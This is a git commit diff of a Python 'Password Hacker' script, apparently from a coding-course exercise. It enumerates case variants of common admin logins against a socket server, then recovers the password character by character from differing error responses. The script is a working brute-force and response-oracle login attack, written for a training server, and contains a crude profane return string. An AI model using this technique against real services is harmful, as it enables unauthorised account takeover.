3e875efce4ba61650e93ae52205cdf65cdd47f77
alcherniaev <playtowin19@gmail.com>
2021-01-15 02:18:08 +0300

    stage 5 done!!

--- Password Hacker/task/hacking/hack.py
+++ Password Hacker/task/hacking/hack.py
@@ -11,7 +11,9 @@ args = sys.argv
 ip_address = args[1]
 port = int(args[2])
 
-char_num = list(string.ascii_lowercase) + list(string.digits)
+
+
+char_num = list(string.ascii_lowercase) + list(string.digits) + list(string.ascii_uppercase)
 
 # connect
 # we need to connect only once, then send massages multiply times
@@ -19,35 +21,67 @@ def connect_server():
     address = (ip_address, port)
     my_socket.connect(address)
 
+def pass_logger_generator():
+    for i in itertools.product(string.ascii_letters + string.ascii_uppercase + string.digits, repeat=1):
+        yield "".join(i)
+
+
+#correct_login = ""
+
+
+
 
 # reading file, send password, receive response
-# instead of brute force search i used file with most common passwords.
-# each letter of word in file i converted with lover/upper case with itertools.product
+# here i use a file with most common admin names.
+# each letter of word in file i converted with lover/upper case with itertools.product and finally get a login
 def get_response():
-    '''for i in range(1, 10):
-        for password in itertools.product(char_num, repeat=i):
-            my_socket.send("".join(password).encode())
-            response = my_socket.recv(1024)
-            if response.decode() == "Connection success!":
-                return "".join(password)
-                exit()'''
     f = open('/Users/alcherniaev/Downloads/logins.txt', 'r')
-
     for line in f:
         for login in map(lambda x: "".join(x), itertools.product(*([letter.lower(), letter.upper()] for letter in line.strip('\n')))):
             password = ' '
-            json_sent = {"login": login, "password": password}
-            with open("log_pas.json", "w") as json_file:
-                json.dumps(json_sent, json_file)
-            my_socket.send(json_file.encode())
-            response = json.load(my_socket.recv(1024))
-            if response.decode() == "Connection success!":
+            json_sent = {} #{"login": login, "password": password}
+            json_sent["login"] = login
+            json_sent["password"] = password
+            my_socket.send(json.dumps(json_sent).encode())
+            response = json.loads(my_socket.recv(1024).decode())
+            if response["result"] == "Wrong password!":
+                correct_login = login
                 f.close()
-                return login
-                exit()
+                return correct_login
+'''connect_server()
+correct_login = get_response()
+print(get_response())'''
+
+def get_password(must_be_correct_login):
+    passw = ""
+    while True:
+        for k in pass_logger_generator():
+            passw += k
+            json_sent = {}
+            json_sent["login"] = must_be_correct_login
+            json_sent["password"] = passw
+            my_socket.send(json.dumps(json_sent).encode(encoding='utf-8'))
+            response = json.loads(my_socket.recv(1024).decode(encoding='utf-8'))
+            if response["result"] == "Exception happened during login":
+                continue
+            elif response["result"] == "Wrong password!":
+                passw = passw[:-1]
+                continue
+            elif response["result"] == "Connection success!":
+                return passw
+            elif response["result"] == "Wrong login!":
+                return "even more fuck"
+
+
+
+def get_final_json():
+    return json.dumps({"login": get_response(), "password": get_password(correct_login)})
+
 
 
 connect_server()
-print(get_response())
+correct_login = get_response()
+print(get_final_json())
+
 
 
